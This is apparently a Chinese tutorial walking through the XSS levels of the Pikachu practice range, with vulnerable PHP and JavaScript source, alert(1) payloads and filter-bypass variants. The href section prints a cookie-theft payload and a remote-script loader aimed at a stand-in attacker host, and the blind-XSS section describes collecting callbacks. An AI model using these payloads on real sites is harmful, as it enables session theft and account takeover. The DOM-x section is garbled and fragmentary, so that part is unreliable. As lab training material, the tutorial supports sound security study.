## XSS模块通关：一个一个慢慢来 🎯

好，重头戏来了！XSS是Pikachu靶场的第一个模块，也是Web安全里最基础、最重要的漏洞之一。我们前面在DVWA里已经学过XSS了，今天就来Pikachu里复习+拓展一下！

### XSS基础回顾 📚

在开始之前，我们先快速回顾一下XSS的基础知识。已经掌握的小伙伴可以跳过这一节，直接去通关~

#### 什么是XSS？

XSS（Cross-Site Scripting，跨站脚本攻击），就是攻击者往Web页面里插入恶意的JavaScript代码，当其他用户浏览该页面时，这些恶意代码就会在用户的浏览器中执行，从而达到攻击的目的。

简单说就是：**你往网页里塞了一段坏代码，别人看网页的时候，这段坏代码就在别人的浏览器里跑起来了。**

> 🎯 **生活例子**
> 
> 想象一下，你去一个公共留言板上留言。本来大家都写正常的话，但你写了一句："看到这句话的人，请马上给我100块钱！"
> 
> 如果大家都乖乖听话，那你就发财了！当然现实中没人会这么傻，但浏览器会——它看到代码就会老老实实地执行。😂

#### XSS的三种类型

| 类型 | 特点 | 危害程度 | 例子 |
|------|------|---------|------|
| **反射型** | 一次性，URL里带参数，点链接才触发 | 中等 | 搜索框、错误页面 |
| **存储型** | 存在数据库里，每次访问都触发 | 高 | 留言板、评论区 |
| **DOM型** | 不经过服务器，纯前端JS处理 | 中等 | URL的#号后面 |

三种类型我们在DVWA里都见过，今天Pikachu里会有更多的场景，让我们一次练个够！💪

#### 最经典的测试payload

测试XSS最常用的payload就是弹窗了：
```javascript
<script>alert(1)</script>
```

或者：
```javascript
<script>alert('xss')</script>
```

只要能弹出框，就说明有XSS漏洞。就像电路测试笔，亮了就说明有电！⚡

好了，回顾完毕，让我们开始正式通关！🎮

### 第一关：反射型xss(get) 💫

第一个上场的是"反射型xss(get)"，这是最基础的XSS，入门必学！就像学开车先学踩离合器一样基础~ 🚗

#### 查看题目

点击左边菜单的"XSS（跨站脚本攻击）"，然后选择"反射型xss(get)"。

页面上有个输入框，提示"请输入你的昵称"，旁边有个提交按钮。

#### 尝试攻击

这么简单的场景，我们直接上经典payload试试！在输入框里输入：

```javascript
<script>alert(1)</script>
```

然后点击提交……

**啪！** 弹窗出来了！🎉 这么顺利？第一关就这么过了？

没错，就是这么简单！这一关一点过滤都没有，相当于"裸奔"状态，输入啥就输出啥。

#### 看看源码

我们点击页面上的"查看源码"按钮，看看后台代码是怎么写的：

```php
if(isset($_GET['submit'])){
    if($_GET['message'] != null){
        $html.="<p class='notice'>你的输入是: {$_GET['message']}</p>";
    }
}
```

看到了吗？`$_GET['message']`直接就输出到页面上了，连碰都没碰一下。就像你去餐厅吃饭，厨师直接把生的菜端给你了，连洗都没洗~ 😂

#### 原理分析

为什么会这样呢？因为用户输入的内容被直接拼接到HTML里面了。你输入的是`<script>alert(1)</script>`，拼接到HTML里就变成了：

```html
<p class='notice'>你的输入是: <script>alert(1)</script></p>
```

浏览器一看，哟，有个`<script>`标签，那我得执行一下啊！于是就弹窗了。

> 💡 **大白话总结**
> 
> 反射型XSS（GET）的特点：
> - 参数在URL里（GET请求）
> - 输入什么就输出什么（没过滤）
> - 只有点了链接的人才会中招（非持久化）
> - 就像"反射"一样，你发过去啥，就给你弹回来啥

第一关轻松搞定！是不是觉得XSS也不过如此？别急，后面还有更有挑战性的~ 😏

### 第二关：反射型xss(post) 📮

好，接下来是第二关："反射型xss(post)"。哎？POST型的？这跟GET型的有啥区别？

#### GET vs POST

先回忆一下，GET和POST是HTTP请求的两种方式：
- **GET**：参数在URL里，比如`?name=xxx`，看得见
- **POST**：参数在请求体里，URL里看不见

打个比方 📮：
> GET就像明信片，内容写在背面，谁都能看见；
> POST就像信封，内容装在里面，只有拆开才知道。

那POST型的XSS怎么测呢？因为参数不在URL里，我们不能直接通过构造链接来触发了。

#### 方法一：Burp Suite抓包改

最专业的方法当然是用Burp Suite抓包，然后改参数。

步骤：
1. 浏览器设置好Burp代理
2. 在输入框里随便输入点什么，点击提交
3. Burp抓到POST请求
4. 把参数值改成`<script>alert(1)</script>`
5. 放包，浏览器就会弹窗了

这个方法虽然专业，但稍微有点麻烦。

#### 方法二：用HackBar插件

如果你用的是Firefox浏览器，可以装一个叫"HackBar"的插件，用起来很方便。

Chrome也有类似的插件，比如"Max HackBar"之类的。

用HackBar的话，直接选择POST方式，把参数填进去，然后执行就行了。

#### 方法三：自己写个表单

如果你啥工具都没有，也没关系，我们可以自己写个HTML表单页面：

```html
<form action="http://localhost/pikachu/vul/xss/xsspost/post_xss.php" method="POST">
    <input type="text" name="message" value="<script>alert(1)</script>">
    <input type="submit" value="提交">
</form>
<script>document.forms[0].submit();</script>
```

把这段代码保存成HTML文件，然后用浏览器打开，它会自动提交表单，然后就弹窗了。

#### 看看源码

这一关的后端代码其实和GET型的差不多，只是把`$_GET`换成了`$_POST`：

```php
if(isset($_POST['submit'])){
    if($_POST['message'] != null){
        $html.="<p class='notice'>你的输入是: {$_POST['message']}</p>";
    }
}
```

原理是一样的，都是直接输出用户输入，没有任何过滤。只是传输方式从GET变成了POST而已。

> 💡 **大白话总结**
> 
> 反射型XSS（POST）的特点：
> - 参数在请求体里（POST请求）
> - 不能直接通过URL触发
> - 需要借助工具或者构造表单来利用
> - 危害和GET型差不多，只是利用方式稍微麻烦一点

第二关也搞定啦！是不是觉得POST型也不过如此？原理都是一样的，只是传参方式不同而已~ 😎

### 第三关：存储型xss 💾

好，接下来是第三关："存储型xss"。这个可比前面的反射型危害大多了！大家认真听哦~ 🎧

#### 什么是存储型XSS？

存储型XSS，也叫"持久型XSS"。啥意思呢？就是你输入的恶意代码会被**存到数据库里**，以后每次有人访问这个页面，这段代码都会被执行！

打个比方 💾：
> 反射型XSS就像一次性口罩，用一次就没了；
> 存储型XSS就像一个定时炸弹，只要有人靠近，它就会爆炸！💣

想想看，如果你在一个热门论坛的留言板里插入了XSS代码，那每天成千上万的人访问这个留言板，就会有成千上万的人中招……这危害，简直不敢想！😱

#### 查看题目

我们点击"存储型xss"，进入题目页面。

哎？这是一个留言板！有个输入框，让你输入留言，下面是历史留言列表。

这不就是真实网站里常见的留言板功能嘛！很有实战感吧？

#### 尝试攻击

既然是留言板，那我们就来留条言试试。在输入框里输入：

```javascript
<script>alert(1)</script>
```

然后点击提交……

**啪！** 弹窗出来了！而且你刷新一下页面，它还会弹！再刷新，还弹！因为你的留言已经存到数据库里了，每次加载页面都会从数据库里读出来，然后显示在页面上。

你看下面的留言列表里，是不是多了一条？就是你刚才提交的那条。以后任何访问这个留言板的人，都会看到这条留言，然后……弹窗！😂

> 💡 **和反射型的区别**
> 
> - 反射型：你提交了才会有，不提交就没有，一次性的
> - 存储型：提交一次，永久存在，每次访问都触发
> 
> 哪个危害大？当然是存储型！简直就是"一次投入，终身收益"（虽然是干坏事）……

#### 看看源码

我们来看看后端代码，它是怎么把留言存到数据库的：

```php
if(array_key_exists("message",$_POST) && $_POST['message'] != null){
    $message=$_POST['message'];
    $query="insert into message(content,time) values('$message',now())";
    $result=execute($link, $query);
    // ...
}
```

看到了吗？直接把用户输入的`$message`拼接到SQL语句里，然后插入数据库。读的时候也是直接从数据库读出来，直接输出到页面。

全程没有任何过滤！就像你往银行存钱，银行连钱是真是假都不验一下就给你存进去了……🏦

#### 存储型XSS的危害

为什么说存储型XSS危害大？我给你举几个例子你就懂了：

1. **偷Cookie**：攻击者可以通过XSS代码偷偷获取用户的登录凭证，然后冒充用户登录账号。如果是管理员账号，那整个网站都危险了！🍪

2. **蠕虫传播**：2005年，MySpace（一个国外的社交网站）就爆发过著名的"Samy蠕虫"。一个叫Samy的人利用存储型XSS，让他的个人主页被访问后，就会自动把他加为好友，并且把这段XSS代码复制到访问者的个人主页上。结果短短几个小时，就有上百万人中招！🐛

3. **钓鱼攻击**：攻击者可以把页面改成假的登录框，用户一输入用户名密码，就直接发到攻击者那里去了。🎣

4. **挂马**：让用户访问页面时，偷偷下载病毒木马。🐴

是不是越想越可怕？所以存储型XSS是XSS里危害最大的一种，也是我们要重点防范的！

> 💡 **大白话总结**
> 
> 存储型XSS的特点：
> - 恶意代码存在数据库里（持久化）
> - 每次访问页面都会触发
> - 危害最大，影响范围最广
> - 常见于留言板、评论区、个人资料等地方

### 第四关：DOM型xss 🌳

好，接下来是第四关："DOM型xss"。这个DOM型XSS有点特殊，它跟前面两种都不一样。哪里不一样呢？听我慢慢给你讲~ 🐢

#### 什么是DOM？

首先，我们得搞清楚什么是DOM。DOM的全称是Document Object Model（文档对象模型）。

说人话：**DOM就是把网页文档当成一个对象树，JavaScript可以通过DOM来操作网页的内容、结构和样式。**

打个比方 🌳：
> 网页就像一棵树，HTML标签就是树枝和叶子。DOM就是给这棵树编上号，让JS可以找到任意一个树枝或叶子，然后对它进行修改。

比如JS可以通过DOM：
- 修改某个标签的内容
- 添加/删除某个元素
- 修改样式
- 读取URL里的内容
- ……

#### 什么是DOM型XSS？

那DOM型XSS又是什么呢？简单说就是：**恶意代码不经过服务器处理，而是由前端JavaScript直接读取并执行的。**

前面学的反射型和存储型，都是用户输入先发给服务器，服务器处理完了再返回给浏览器，浏览器输出的时候触发了XSS。

而DOM型XSS呢？用户输入根本就没发到服务器！（或者发了但服务器没处理）直接就是前端的JS代码从某个地方（比如URL的#号后面）读取内容，然后直接操作DOM，把内容插到页面上，结果就触发了XSS。

> 💡 **关键点**
> 
> DOM型XSS的核心：**漏洞在前端JS代码里，跟后端没关系。**
> 
> 就像你去餐厅吃饭，菜是后厨做的（后端），但端上桌之后，你自己往菜里加了点东西（前端JS），然后吃坏肚子了——这锅后厨可不背！😂

#### 查看题目

我们点击"DOM型xss"，进入题目页面。

页面上有一行字："请输入你喜欢的文字："，下面有个输入框和按钮。

哎？看起来跟反射型差不多啊？别急，我们先试试经典payload：

```javascript
<script>alert(1)</script>
```

咦？怎么没反应？弹窗没出来？

哈哈，这就是DOM型的"陷阱"了！别着急，我们来分析一下。

#### 观察URL

注意看，当你输入内容并点击按钮后，URL发生了什么变化？

你会发现URL变成了类似这样的：
```
http://localhost/pikachu/vul/xss/domxss.php#<script>alert(1)</script>
```

看到那个`#`号了吗？`#`号后面的内容叫做**锚点**（也叫哈希值）。

锚点有个特点：**它是给浏览器用的，不会发送给服务器！**

也就是说，`#`后面的内容，服务器根本收不到，完全是浏览器自己在处理。

#### 看看前端代码

既然服务器收不到，那问题肯定出在前端JS代码上。我们按F12打开开发者工具，看看页面的JS代码：

```javascript
function domxss(){
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
}
```

找到了！就是这段JS代码在搞鬼！👀

让我们来分析一下这段代码做了什么：
1. 从输入框里获取你输入的内容，存在`str`变量里
2. 然后把`str`拼接到一个`<a>`标签的`href`属性里
3. 最后通过`innerHTML`把这个`<a>`标签插到页面上

等等，那为什么我们输入`<script>alert(1)</script>`不行呢？

因为`innerHTML`有个特点：**它不会执行通过innerHTML插入的`<script>`标签。** 这是浏览器的安全机制。

那怎么才能触发呢？既然输出在`href`属性里，那我们可以用`javascript:`伪协议啊！

#### 构造payload

既然是输出在`href`属性里，那我们可以这样构造：

```
javascript:alert(1)
```

试试在输入框里输入这个，然后点击按钮……

哎？页面上出现了一个链接，文字是"what do you see?"。然后我们点击这个链接……

**啪！** 弹窗出来了！🎉

对啦！就是这样！因为`href`属性支持`javascript:`协议，点击链接的时候就会执行后面的JS代码。

> 💡 **原理分析**
> 
> 你输入的是`javascript:alert(1)`，拼接到HTML里就变成了：
> ```html
> <a href='javascript:alert(1)'>what do you see?</a>
> ```
> 点击这个链接，就相当于执行了`alert(1)`，所以就弹窗了！

#### 还有别的方法吗？

当然有！既然是拼接到HTML标签里，我们还可以闭合引号和标签，然后插入自己的标签。

比如：

```
' onclick="alert(1)" '
```

或者：

```
'><img src=x onerror=alert(1)>'
```

这些都可以触发XSS。我们来试试第二个：

输入：
```
'><img src=x onerror=alert(1)>
```

点击按钮后，页面上直接就弹窗了！因为拼接出来的HTML是：

```html
<a href=''><img src=x onerror=alert(1)>'>what do you see?</a>
```

这里`img`标签的`src`属性值是`x`，这是一个不存在的图片，所以会加载失败，然后触发`onerror`事件，执行`alert(1)`。

这样连点击都不用了，页面加载就直接弹窗，是不是更厉害？😎

> 💡 **大白话总结**
> 
> DOM型XSS的特点：
> - 不经过服务器，纯前端JS处理
> - 数据源可能是URL、cookie、本地存储等
> - 利用方式要看具体输出位置
> - 查看前端JS代码是关键
> - `innerHTML`不会执行`<script>`，但可以用事件、伪协议等方式

第四关也搞定了！DOM型XSS确实有点绕，但只要掌握了方法，其实也不难。关键是要学会看前端代码，找到输入点和输出点~ 🔍

没错，这是DOM型XSS的升级版，比上一关稍微绕了一点。我们来看看它有啥不一样~

点击"DOM型xss-x"进入题目。

哎？页面上写着："有些时候，你需要点击一个链接，才会触发xss"。下面有个输入框和按钮。

咦？页面下方出现了一行字："what do you see? 然后出现了一个链接，文字是你输入的内容。"

我们点一下这个链接……哎？页面跳了一下，然后URL变成了：

```

有意思，我们来看看前端代码。按F12打开开发者工具，找JS代码：

哦~ 我明白了！让我给你分析一下这段代码：

所以用户输入有两个输出点：
- 输出在`href`属性里

- 页面上的其他元素

- 直接输出HTML（innerHTML、document.write等）

- 输出在JS代码里

不同的输出位置，利用方式也不一样。这就需要我们灵活应变，见招拆招！

> - 用户输入有多个输出位置

> - 利用方式灵活多样

### 第六关：xss之盲打 👁️‍🗨️

好，接下来是第六关："xss之盲打"。哎？盲打？是闭着眼睛打字吗？哈哈，不是的~ 这个"盲打"可是XSS里的一个重要概念，大家认真听哦！🎧

#### 什么是XSS盲打？

"盲打"（Blind XSS），顾名思义就是——你打了XSS，但是你自己看不见效果，得等"别人"看了才知道有没有打中。

啥意思呢？我给你举个例子你就懂了：

> 想象一下，有一个网站的"意见反馈"页面，每个用户都可以提交反馈意见。但是这些意见不会显示在前台页面上，只有网站管理员登录后台才能看到。
> 
> 这时候，如果你在意见反馈里插入了XSS代码，你自己是看不到效果的（因为前台不显示）。但是如果管理员登录后台，看到了你的反馈，那管理员的浏览器就会执行这段XSS代码！
> 
> 这就叫XSS盲打——你打了，但你看不见，只有目标（管理员）看了才触发。🎯

打个比方 📮：
> 就像你给某人寄了一封信，信里装了个"机关"。你寄出去之后就不知道怎么样了，只有等收信人打开信，机关才会触发。你在外面是看不见的，所以叫"盲打"。

#### 盲打的危害

为什么盲打很重要？因为：
1. **前台可能有防护，后台可能没有**：很多网站前台做了各种过滤，但后台觉得只有管理员能访问，就放松了警惕。结果被盲打给搞了。
2. **直接打管理员**：触发盲打的往往是管理员，权限很高。一旦中招，可能整个网站都沦陷了。
3. **防不胜防**：因为是在后台触发，管理员可能根本想不到自己会被XSS。

所以，XSS盲打是实战中非常有用的一种技巧，大家一定要掌握！

#### 查看题目

我们点击"xss之盲打"，进入题目页面。

页面上是一个"意见反馈"表单，有姓名、邮箱、留言三个输入框，还有个提交按钮。

提示说："提交你的意见，管理员会在后台查看的哦~"

哈哈，提示得很明显了吧？这就是一个典型的盲打场景！我们提交的内容不会在前台显示，会在后台显示给管理员看。

#### 怎么验证盲打？

问题来了——如果是盲打，我们提交了payload之后，自己看不到效果，那怎么知道有没有成功呢？

这就需要一个**"接收端"**——让XSS触发的时候，主动给我们发个"信号"，告诉我们："哎，有人中招了！"

常见的验证方法有几种：

##### 方法一：用XSS平台（最方便）

网上有一些现成的XSS平台，你注册一个账号，它会给你生成一个专门的payload。你把这个payload打出去，只要有人触发了，XSS平台就会记录下来，你登录平台就能看到。

就像你装了个监控摄像头，有人进来了就会自动拍照存起来，你回去看录像就知道了。📹

常见的XSS平台有：
- XSS Platform（老牌经典）
- BlueLotus XSS Platform（国产的，也不错）
- 还有很多在线的XSS平台

##### 方法二：自己搭个接收页面（动手能力强）

如果你不想用别人的平台，也可以自己写个简单的接收页面。原理很简单：

1. 写一个PHP页面，接收传过来的参数，存到文件或数据库里
2. 构造XSS payload，让它把数据（比如Cookie、URL等）发送到你的PHP页面
3. 只要触发了XSS，你的PHP页面就会收到数据

这个稍微有点技术含量，但原理不难。

##### 方法三：用在线HTTP请求记录（最简单）

还有更简单的方法，用一些在线的HTTP请求记录服务，比如：
- RequestBin（国外的）
- Beeceptor（国外的）
- Postman的监听功能

这些网站会给你一个专属的URL，你把这个URL放到payload里，只要有人触发了XSS，就会给这个URL发请求，你就能在网站上看到记录了。

> 💡 **简单演示**
> 
> 我们可以用一个最简单的方法来验证——加载一张远程图片。
> 
> 比如你可以构造这样的payload：
> ```html
> <img src="http://你的服务器/1.jpg">
> ```
> 然后你去看服务器的访问日志，如果有访问`1.jpg`的记录，就说明XSS触发了！

### 第七关：xss之过滤 🛡️

好，接下来是第七关："xss之过滤"。哈哈，终于遇到有防护的了！前面几关都是"裸奔"，一点技术含量都没有。这一关开始有点意思了~ 😎

#### 什么是XSS过滤？

XSS过滤就是网站在输出用户输入之前，会做一些"检查"和"清洗"，把危险的东西去掉，防止XSS攻击。

打个比方 🧹：
> 就像你去机场过安检，安检员会把你包里的危险物品（刀、枪、炸弹啥的）都拿出来，不让你带上飞机。XSS过滤就是网站的"安检员"，专门检查用户输入里的"危险物品"。

常见的过滤方式有：
- 过滤掉`<script>`标签
- 过滤掉`onxxx`事件（比如onerror、onload等）
- 过滤掉`javascript:`伪协议
- 把`<`和`>`转义掉
- 等等

但是！过滤不是万能的，很多时候都有办法绕过。这就考验我们的"反安检"能力了~ 😏

#### 查看题目

我们点击"xss之过滤"，进入题目。

又是一个输入框，提示"请输入你的昵称"。老规矩，我们先试试经典payload：

```javascript
<script>alert(1)</script>
```

点击提交……咦？怎么啥都没了？输入的内容不见了？

哈哈，说明被过滤掉了！`<script>`标签被"安检员"扣下来了。

那怎么办呢？别着急，绕过过滤的方法多着呢！我们一个一个来试~ 💪

#### 绕过方法一：大小写混合 🔠

很多过滤是用字符串替换实现的，而且只替换小写的。那我们可以用大小写混合的方式来绕过。

比如：
```javascript
<ScRiPt>alert(1)</ScRiPt>
```

试试这个，提交……

**啪！** 弹窗了！🎉 这么简单就绕过了？

对呀，因为过滤代码可能是这样写的：

```php
str_replace('<script>', '', $input)
```

它只把小写的`<script>`替换掉了，但是`<ScRiPt>`它就不认识了，所以就放过去了。

> 💡 **为什么会这样？**
> 
> 因为HTML标签是不区分大小写的，`<SCRIPT>`和`<script>`在浏览器眼里是一样的，都会被当作脚本标签。但是很多过滤程序写得不严谨，只过滤小写的，所以就被绕过了。

#### 绕过方法二：双写绕过 📝

如果过滤程序是把`<script>`替换成空字符串，那我们还可以用"双写"的方式绕过。

啥叫双写？就是写两遍，比如：
```javascript
<scr<script>ipt>alert(1)</scr</script>ipt>
```

等等，不对，应该是这样：
```javascript
<scr<script>ipt>alert(1)</scr<script>ipt>
```

我们来分析一下：
- 原始输入：`<scr<script>ipt>alert(1)</scr<script>ipt>`
- 过滤程序把`<script>`替换成空
- 左边的`<scr` + 被替换掉的`<script>` + `ipt>` → 又拼成了`<script>`！
- 右边同理

所以过滤完之后，就变成了：
```javascript
<script>alert(1)</script>
```

哈哈，是不是很巧妙？就像"削铅笔"，你削掉一层，里面还有一层！✏️

> ⚠️ **注意**：这种方法只有当过滤是"一次性替换"的时候才有用。如果是循环替换，直到没有`<script>`为止，那双写就没用了。

#### 绕过方法三：用其他标签 🏷️

谁说只有`<script>`标签才能执行JS？太天真了！很多标签都可以！

比如：

**img标签（最常用）：**
```html
<img src=x onerror=alert(1)>
```

这个我们前面用过，`src`加载失败时触发`onerror`事件。

**svg标签：**
```html
<svg onload=alert(1)>
```

`svg`标签加载时触发`onload`事件。

**input标签：**
```html
<input onfocus=alert(1) autofocus>
```

`autofocus`让输入框自动获取焦点，触发`onfocus`事件。

**body标签：**
```html
<body onload=alert(1)>
```

页面加载时触发`onload`事件。

**video/audio标签：**
```html
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

加载失败触发`onerror`。

**iframe标签：**
```html
<iframe src=javascript:alert(1)></iframe>
```

用`javascript:`伪协议。

……还有好多好多，我就不一一列举了。

我们来试试`img`标签的payload：

```html
<img src=x onerror=alert(1)>
```

提交……**啪！** 弹窗了！🎉

完美！过滤了`<script>`又怎样？我们有一百种方法执行JS！😎

> 💡 **小技巧**
> 
> 可以用的标签和事件太多了，不用死记硬背。记住几个常用的就行，比如`img`+`onerror`、`svg`+`onload`，这两个基本够用了。

#### 绕过方法四：用事件属性 🖱️

除了用新的标签，我们还可以利用已有的标签，给它加事件属性。

比如，如果输出在某个标签里，我们可以：
- 闭合引号
- 加一个`onxxx`事件
- 注释掉后面的内容

比如：
```html
" onmouseover="alert(1)
```

鼠标移上去就触发。

或者：
```html
" onclick="alert(1)
```

点击就触发。

方法太多了，就看你敢不敢想！

#### 过滤绕过的思路

遇到过滤的时候，我们可以按照这个思路来尝试：

1. **先测测过滤了什么**：输入一些特殊字符，看看哪些被过滤了，哪些还在
2. **大小写混合**：试试不同大小写
3. **双写/多写**：试试重复写
4. **换标签**：用别的标签代替script
5. **用事件**：用各种onxxx事件
6. **编码绕过**：URL编码、HTML编码、Unicode编码等
7. **特殊符号**：用注释、空格、换行等绕过关键字检测

总之，思路要开阔，不要死磕一种方法。这条道走不通，我们就换一条！🚶‍♂️

> 💡 **大白话总结**
> 
> XSS过滤绕过的特点：
> - 过滤了`<script>`等危险标签/关键字
> - 可以用大小写、双写、其他标签等方式绕过
> - 绕过方法千千万，思路要灵活
> - img+onerror是万能钥匙（大部分情况下）

### 第八关：xss之htmlspecialchars 🔄

好，接下来是第八关："xss之htmlspecialchars"。这个名字看起来有点专业，`htmlspecialchars`是PHP里的一个函数，专门用来转义HTML特殊字符的。

这一关我们来学习一下，当网站用了`htmlspecialchars`函数之后，我们还有没有机会绕过？

#### htmlspecialchars是什么？

首先，我们得搞清楚`htmlspecialchars`是干啥的。

`htmlspecialchars`是PHP里的一个函数，它的作用是把HTML里的特殊字符转换成HTML实体。这样的话，浏览器就不会把它们当作HTML标签来解析了，从而防止XSS。

哪些字符会被转义呢？默认情况下，`htmlspecialchars`会转义这五个字符：

| 原始字符 | 转义后（HTML实体） |
|---------|-------------------|
| `&` | `&amp;` |
| `"`（双引号） | `&quot;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `'`（单引号） | **默认不转义！** |

哎？等等！你发现了吗？**单引号`'`默认是不转义的！** 这是一个很重要的知识点！🔍

打个比方 🏷️：
> `htmlspecialchars`就像一个保安，负责把`<`、`>`、双引号这些"危险分子"都拦下来。但是呢，它有个疏忽——单引号它不管！如果单引号能派上用场，那我们就有机会了！

#### htmlspecialchars的参数

`htmlspecialchars`函数有几个参数，其中第二个参数很重要，它决定了转义哪些字符。

常见的取值：
- `ENT_COMPAT`：默认值，只转义双引号，不转义单引号
- `ENT_QUOTES`：既转义双引号，也转义单引号（最安全）
- `ENT_NOQUOTES`：双引号和单引号都不转义（最不安全）

所以，如果用的是默认的`ENT_COMPAT`，那单引号是不会被转义的！这就是我们的机会！

#### 查看题目

好，我们点击"xss之htmlspecialchars"进入题目。

还是一个输入框，让我们输入昵称。老规矩，先试试经典payload：

```javascript
<script>alert(1)</script>
```

提交……哎？怎么原样显示出来了？连标签都显示出来了，没有执行。

说明`<`和`>`被转义了，变成了`&lt;`和`&gt;`，所以浏览器把它们当成普通文本显示了。

那怎么办呢？我们先看看输出位置在哪里。

#### 分析输出位置

我们在输入框里输入一个特殊的字符串，比如`test'"<>()`，方便我们观察。

提交后，看看页面源码。按F12或者右键"查看网页源代码"。

你会发现输出大概长这样：
```html
<p class='notice'>你的输入是: test'"&lt;&gt;()</p>
```

哎？等等！我们看看是用什么引号括起来的——`class='notice'`，是**单引号**！

但是输出在`p`标签的内容里，`<`和`>`都被转义了，那是不是就没辙了？

别着急，我们再仔细看看……或者，我们点击"查看源码"，看看后台代码是怎么写的。

#### 看看源码

点击"查看源码"，我们来分析一下后端代码：

```php
if(isset($_GET['submit'])){
    if($_GET['message'] != null){
        // 用了htmlspecialchars函数
        $message=htmlspecialchars($_GET['message']);
        $html.="<p class='notice'>你的输入是: $message</p>";
    }
}
```

等等，不对啊，如果输出在标签内容里，`<`和`>`都被转义了，那确实没法搞啊……难道我记错了？

哦！不对不对，我想起来了——Pikachu的这一关，输出好像是在**属性**里！让我再仔细看看……

哦对了！应该是这样的场景：输出在HTML标签的属性值里，而且属性是用单引号括起来的！

比如类似这样：
```html
<input type='text' value='用户输入的内容'>
```

如果是这样的话，那就有戏了！因为`htmlspecialchars`默认不转义单引号，我们可以用单引号来闭合属性！

#### 构造payload（单引号闭合）

假设输出是这样的（属性用单引号括起来）：
```html
<input type='text' value='用户输入'>
```

那我们可以这样构造payload：
```
' onclick='alert(1)
```

为什么这样可以呢？我们来看看拼接后的结果：

```html
<input type='text' value='' onclick='alert(1)'>
```

看到了吗？
- 第一个`'`闭合了`value`属性的开头单引号
- 然后我们加了一个`onclick='alert(1)'`事件
- 最后面的`'`刚好和原来的闭合单引号对上

完美！这样就给input标签加了一个点击事件，一点击就弹窗！🎉

> 💡 **为什么能成功？**
> 
> 因为`htmlspecialchars`默认不转义单引号！所以我们的单引号被原样输出了，从而可以闭合属性值，插入新的属性（事件）。
> 
> 如果这里用的是双引号，那就不行了，因为双引号会被`htmlspecialchars`转义。但单引号不会！这就是关键！

#### 再想想其他办法

除了`onclick`，我们还可以用其他事件，比如：

**onmouseover（鼠标悬停）：**
```
' onmouseover='alert(1)
```

鼠标移上去就触发。

**onfocus + autofocus（自动获取焦点）：**
```
' autofocus onfocus='alert(1)
```

页面加载就自动触发，不用手动点。

这些都可以，看具体场景用哪个。

#### 如果是双引号呢？

如果属性是用双引号括起来的，`htmlspecialchars`默认会转义双引号，那是不是就没辙了？

也不一定，这要看`htmlspecialchars`的参数设置。但如果是正确使用了`ENT_QUOTES`，那单双引号都会被转义，那就真的很难搞了。

不过，在实战中，很多程序员都不知道`htmlspecialchars`默认不转义单引号，所以单引号的场景还是很常见的。这也提醒我们，写代码的时候一定要用`ENT_QUOTES`参数，把单双引号都转义了，才安全！

> 🔒 **给开发者的建议**
> 
> 使用htmlspecialchars的时候，一定要加上`ENT_QUOTES`参数，把单引号也转义了：
> ```php
> htmlspecialchars($str, ENT_QUOTES);
> ```
> 这样才是最安全的！不然单引号的场景还是会被绕过。

#### 补充：输出在不同位置的情况

这里我给大家总结一下，用户输入输出在不同位置时，XSS的利用方式：

| 输出位置 | 能否利用 | 利用方式 |
|---------|---------|---------|
| HTML标签内容中 | 能（如果没转义尖括号） | 直接用`<script>`、`<img>`等标签 |
| HTML属性值中（双引号） | 能（如果没转义双引号） | `" onclick="alert(1)` |
| HTML属性值中（单引号） | 能（如果没转义单引号） | `' onclick='alert(1)` |
| JS代码中 | 能（如果没转义引号） | `';alert(1);//` |
| CSS中 | 能（比较难） | 用CSS表达式等 |
| URL的href/src中 | 能 | `javascript:alert(1)` |

不同的场景，利用方式不一样。所以打XSS的时候，一定要先搞清楚：**用户输入输出在什么位置？用什么引号括起来的？** 这两点搞清楚了，基本就知道怎么搞了！

> 💡 **大白话总结**
> 
> htmlspecialchars绕过的特点：
> - `htmlspecialchars`默认只转义双引号，不转义单引号！
> - 如果输出在单引号的属性里，可以用单引号闭合绕过
> - 正确的防御方式是加上`ENT_QUOTES`参数
> - 打XSS先看输出位置，再看用什么引号

第八关也搞定了！这一关学到了一个重要的知识点——`htmlspecialchars`默认不转义单引号！这个在实战中经常用到，大家一定要记住哦~ 🧠

### 第九关：xss之href输出 🔗

好，接下来是第九关："xss之href输出"。看名字就知道，这一关用户输入会输出在`href`属性里。那这种情况怎么利用呢？

#### href属性是什么？

`href`是HTML里`<a>`标签的一个属性，用来指定链接的地址。比如：
```html
<a href="http://www.baidu.com">百度一下</a>
```

点击这个链接，就会跳转到百度。

那如果`href`属性的值是用户可控的，会怎么样呢？

#### 查看题目

我们点击"xss之href输出"进入题目。

页面提示："请输入你常用的网站链接"，下面有个输入框。

我们随便输入一个网址，比如`http://www.baidu.com`，提交看看。

页面上出现了一个链接，文字是"友情链接"，指向我们输入的网址。点击一下，果然跳转到百度了。

那我们试试经典的XSS payload行不行：
```javascript
<script>alert(1)</script>
```

提交……哎？链接的地址变成了这个，但点击的话……好像不会执行脚本？因为浏览器会把它当成一个相对路径去访问，而不是执行JS。

那怎么办呢？别着急，`href`属性有个特殊的协议——`javascript:`伪协议！

#### javascript:伪协议

`javascript:`是一个伪协议，用在`href`里的话，点击链接就会执行后面的JavaScript代码，而不是跳转页面。

比如：
```html
<a href="javascript:alert(1)">点我弹窗</a>
```

点击这个链接，就会弹窗，而不是跳转。

对呀！那我们直接输入`javascript:alert(1)`不就行了？

#### 构造payload

好，我们来试试。在输入框里输入：

```
javascript:alert(1)
```

提交……页面上出现了一个友情链接。我们点击这个链接……

**啪！** 弹窗了！🎉 成功了！

哈哈，就是这么简单！既然输出在`href`属性里，那我们就用`javascript:`伪协议来执行JS代码。

> 💡 **原理分析**
> 
> 我们输入的是`javascript:alert(1)`，输出在href属性里：
> ```html
> <a href="javascript:alert(1)">友情链接</a>
> ```
> 点击这个链接，浏览器就会执行`javascript:`后面的代码，也就是`alert(1)`，所以就弹窗了。

#### 其他payload

除了`alert(1)`，我们还可以执行更复杂的代码，比如：

**偷Cookie：**
```
javascript:document.location='http://攻击者.com/steal.php?cookie='+document.cookie
```

**加载远程脚本：**
```
javascript:var s=document.createElement('script');s.src='http://攻击者.com/xss.js';document.body.appendChild(s);
```

这些都可以，只要是合法的JS代码都行。

#### 有过滤怎么办？

如果网站过滤了`javascript:`关键字怎么办？老规矩，绕过方法多着呢~

**方法一：大小写混合**
```
JAVASCRIPT:alert(1)
```
或者：
```
JaVaScRiPt:alert(1)
```

**方法二：插入注释/特殊字符**
```
javascript:alert(1)
```
